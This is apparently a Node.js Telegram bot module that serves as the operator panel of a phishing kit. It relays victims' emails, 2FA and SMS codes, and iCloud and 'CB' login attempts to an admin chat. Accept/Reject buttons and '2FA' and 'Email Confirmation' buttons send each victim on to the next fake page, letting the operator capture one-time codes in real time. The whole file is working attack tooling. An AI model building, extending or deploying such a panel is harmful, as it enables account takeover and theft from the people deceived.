const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID/CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

// Initialize bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// -----------------
// 2FA Code Backend (with requestId for frontend integration)
// -----------------
let pendingRequests = {};

// Send 2FA code to admin with Accept/Reject inline keyboard, callback_data includes requestId
function send2FACode(code, requestId) {
  pendingRequests[requestId] = true;
  bot.sendMessage(ADMIN_CHAT_ID, `2FA code: ${code}\nRequest ID: ${requestId}`, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'Accept', callback_data: `2fa_accept|${requestId}` },
          { text: 'Reject', callback_data: `2fa_reject|${requestId}` }
        ]
      ]
    }
  });
}

// Listen for Accept/Reject replies for 2FA (inline)
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const [action, requestId] = query.data.split('|');
  if (pendingRequests[requestId]) {
    if (action === '2fa_accept') {
      await fetch(`${APP_URL}/api/update-2fa-status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ requestId, status: 'approved' })
      });
      bot.sendMessage(chatId, `2FA code for request ${requestId} accepted.`);
      delete pendingRequests[requestId];
    } else if (action === '2fa_reject') {
      await fetch(`${APP_URL}/api/update-2fa-status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ requestId, status: 'rejected' })
      });
      bot.sendMessage(chatId, `2FA code for request ${requestId} rejected.`);
      delete pendingRequests[requestId];
    }
    bot.answerCallbackQuery(query.id);
    return;
  }

  // Handle other callback queries (for other approval flows)
  try {
    const [action2, identifier] = query.data.split("|");
    let status;
    if (action2 === "accept") status = "accepted";
    else if (action2 === "page1") status = "accepted1";
    else if (action2 === "page2") status = "accepted2";
    else status = "rejected";

    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: identifier, identifier, status })
    });

    try {
      await bot.editMessageText(
        `🔐 <b>${identifier}</b> has been <b>${status.toUpperCase()}</b>`,
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id,
          parse_mode: "HTML"
        }
      );
    } catch {
      await bot.editMessageText(
        `🔐 ${identifier} has been *${status.toUpperCase()}*`,
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
    }

    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });

  } catch (err) {
    console.error("❌ Failed to handle callback:", err);
    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
  }
});

// -----------------
// Email/Password approval
// -----------------
function sendApprovalRequest(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*Login Approval Requested*\n*Email:* ${email}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// Generic code approval
// -----------------
function sendApprovalRequestGeneric(identifier) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${identifier}` },
          { text: "❌ Reject", callback_data: `reject|${identifier}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*Approval Requested*\nIdentifier: ${identifier}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// SMS code approval
// -----------------
function sendApprovalRequestSMS(code) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${code}` },
          { text: "❌ Reject", callback_data: `reject|${code}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*SMS Approval Requested*\n*Code:* ${code}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// iCloud Login approval
// -----------------
function sendApprovalRequestPage(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*iCloud Login Approval Requested*\n*Email:* ${email}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// CB Login approval
// -----------------
async function sendLoginTelegram(email) {
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "↖️ 2FA", callback_data: `page1|${email}` },
          { text: "↗️ Email Confirmation", callback_data: `page2|${email}` }
        ],
        [
          { text: "⚠️❌ REJECT ❌⚠️", callback_data: `reject|${email}` }
        ]
      ]
    }
  };

  const message = `📧 *Email:* ${email}`;
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// /start command for big bot
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.");
});

// /startcb command for CB login bot
bot.onText(/\/startcb/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
});

module.exports = {
  bot,
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram,
  send2FACode
};
